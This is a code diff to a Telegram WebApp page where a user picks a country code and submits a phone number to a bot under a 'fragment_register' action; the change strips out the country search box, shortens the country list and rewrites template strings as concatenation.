@@ -185,19 +185,6 @@
         .dropdown-item:hover {
             background: #F9FAFB;
         }
-        
-        .search-box {
-            padding: 12px;
-            border-bottom: 1px solid #E5E7EB;
-        }
-        
-        .search-input {
-            width: 100%;
-            padding: 8px 12px;
-            border: 1px solid #E5E7EB;
-            border-radius: 8px;
-            font-size: 14px;
-        }
     </style>
 </head>
 <body>
@@ -220,9 +207,6 @@
                     <div style="margin-left: auto;">▼</div>
                 </button>
                 <div class="dropdown-content" id="country-dropdown">
-                    <div class="search-box">
-                        <input type="text" class="search-input" id="country-search" placeholder="Поиск страны..." oninput="filterCountries()">
-                    </div>
                 </div>
             </div>
         </div>
@@ -243,7 +227,6 @@
     </div>
 
     <script>
-        // ALL COUNTRIES DATA
         const countries = [
             { code: '7', flag: '🇷🇺', name: 'Россия' },
             { code: '1', flag: '🇺🇸', name: 'США' },
@@ -259,90 +242,34 @@
             { code: '91', flag: '🇮🇳', name: 'Индия' },
             { code: '55', flag: '🇧🇷', name: 'Бразилия' },
             { code: '52', flag: '🇲🇽', name: 'Мексика' },
-            { code: '61', flag: '🇦🇺', name: 'Австралия' },
-            { code: '64', flag: '🇳🇿', name: 'Новая Зеландия' },
-            { code: '31', flag: '🇳🇱', name: 'Нидерланды' },
-            { code: '41', flag: '🇨🇭', name: 'Швейцария' },
-            { code: '46', flag: '🇸🇪', name: 'Швеция' },
-            { code: '47', flag: '🇳🇴', name: 'Норвегия' },
-            { code: '45', flag: '🇩🇰', name: 'Дания' },
-            { code: '358', flag: '🇫🇮', name: 'Финляндия' },
-            { code: '48', flag: '🇵🇱', name: 'Польша' },
-            { code: '420', flag: '🇨🇿', name: 'Чехия' },
-            { code: '36', flag: '🇭🇺', name: 'Венгрия' },
-            { code: '40', flag: '🇷🇴', name: 'Румыния' },
-            { code: '380', flag: '🇺🇦', name: 'Украина' },
-            { code: '375', flag: '🇧🇾', name: 'Беларусь' },
-            { code: '370', flag: '🇱🇹', name: 'Литва' },
-            { code: '371', flag: '🇱🇻', name: 'Латвия' },
-            { code: '372', flag: '🇪🇪', name: 'Эстония' },
-            { code: '90', flag: '🇹🇷', name: 'Турция' },
-            { code: '20', flag: '🇪🇬', name: 'Египет' },
-            { code: '27', flag: '🇿🇦', name: 'Южная Африка' },
-            { code: '234', flag: '🇳🇬', name: 'Нигерия' },
-            { code: '254', flag: '🇰🇪', name: 'Кения' },
-            { code: '966', flag: '🇸🇦', name: 'Саудовская Аравия' },
-            { code: '971', flag: '🇦🇪', name: 'ОАЭ' },
-            { code: '974', flag: '🇶🇦', name: 'Катар' },
-            { code: '965', flag: '🇰🇼', name: 'Кувейт' },
-            { code: '973', flag: '🇧🇭', name: 'Бахрейн' },
-            { code: '66', flag: '🇹🇭', name: 'Таиланд' },
-            { code: '65', flag: '🇸🇬', name: 'Сингапур' },
-            { code: '60', flag: '🇲🇾', name: 'Малайзия' },
-            { code: '63', flag: '🇵🇭', name: 'Филиппины' },
-            { code: '62', flag: '🇮🇩', name: 'Индонезия' },
-            { code: '84', flag: '🇻🇳', name: 'Вьетнам' }
+            { code: '61', flag: '🇦🇺', name: 'Австралия' }
         ];
 
         let selectedCountry = countries[0];
         let tg = window.Telegram.WebApp;
 
-        // Initialize Telegram WebApp
         tg.expand();
         tg.enableClosingConfirmation();
         
-        // Populate countries dropdown
         function populateCountries() {
             const dropdown = document.getElementById('country-dropdown');
-            const filteredCountries = filterCountries();
-            
             dropdown.innerHTML = '';
             
-            // Add search box
-            const searchBox = document.createElement('div');
-            searchBox.className = 'search-box';
-            searchBox.innerHTML = '<input type="text" class="search-input" id="country-search" placeholder="Поиск страны..." oninput="filterCountries()">';
-            dropdown.appendChild(searchBox);
-            
-            filteredCountries.forEach(country => {
+            countries.forEach(country => {
                 const item = document.createElement('div');
                 item.className = 'dropdown-item';
-                item.innerHTML = `
-                    <div class="flag">${country.flag}</div>
-                    <div class="country-info">
-                        <div class="country-name">${country.name}</div>
-                        <div class="country-code">+${country.code}</div>
-                    </div>
-                `;
-                item.onclick = () => selectCountry(country);
+                item.innerHTML = '<div class="flag">' + country.flag + '</div><div class="country-info"><div class="country-name">' + country.name + '</div><div class="country-code">+' + country.code + '</div></div>';
+                item.onclick = function() { selectCountry(country); };
                 dropdown.appendChild(item);
             });
-        }
-
-        function filterCountries() {
-            const searchTerm = document.getElementById('country-search')?.value.toLowerCase() || '';
-            return countries.filter(country => 
-                country.name.toLowerCase().includes(searchTerm) || 
-                country.code.includes(searchTerm)
-            );
         }
 
         function selectCountry(country) {
             selectedCountry = country;
             document.getElementById('selected-flag').textContent = country.flag;
             document.getElementById('selected-country').textContent = country.name;
-            document.getElementById('selected-code').textContent = `+${country.code}`;
-            document.getElementById('phone-prefix').textContent = `+${country.code}`;
+            document.getElementById('selected-code').textContent = '+' + country.code;
+            document.getElementById('phone-prefix').textContent = '+' + country.code;
             toggleDropdown();
             document.getElementById('phone').focus();
         }
@@ -354,7 +281,6 @@
             } else {
                 dropdown.style.display = 'block';
                 populateCountries();
-                document.getElementById('country-search').focus();
             }
         }
 
@@ -367,12 +293,11 @@
             const phone = phoneInput.value.replace(/\D/g, '');
             
             if (phone.length >= 5) {
-                const fullPhone = `+${selectedCountry.code}${phone}`;
+                const fullPhone = '+' + selectedCountry.code + phone;
                 
                 tg.sendData(JSON.stringify({
                     phone: fullPhone,
-                    action: 'fragment_register',
-                    country: selectedCountry.name
+                    action: 'fragment_register'
                 }));
                 
                 tg.showPopup({
@@ -390,23 +315,17 @@
             }
         }
         
-        // Initialize countries on load
         document.addEventListener('DOMContentLoaded', function() {
             populateCountries();
+            document.getElementById('phone').focus();
         });
         
-        // Close dropdown when clicking outside
         document.addEventListener('click', function(event) {
             const dropdown = document.getElementById('country-dropdown');
             const btn = document.querySelector('.country-btn');
-            if (btn && !btn.contains(event.target) && dropdown && !dropdown.contains(event.target)) {
+            if (!btn.contains(event.target)) {
                 dropdown.style.display = 'none';
             }
-        });
-
-        // Focus on phone input when page loads
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('phone').focus();
         });
     </script>
 </body>
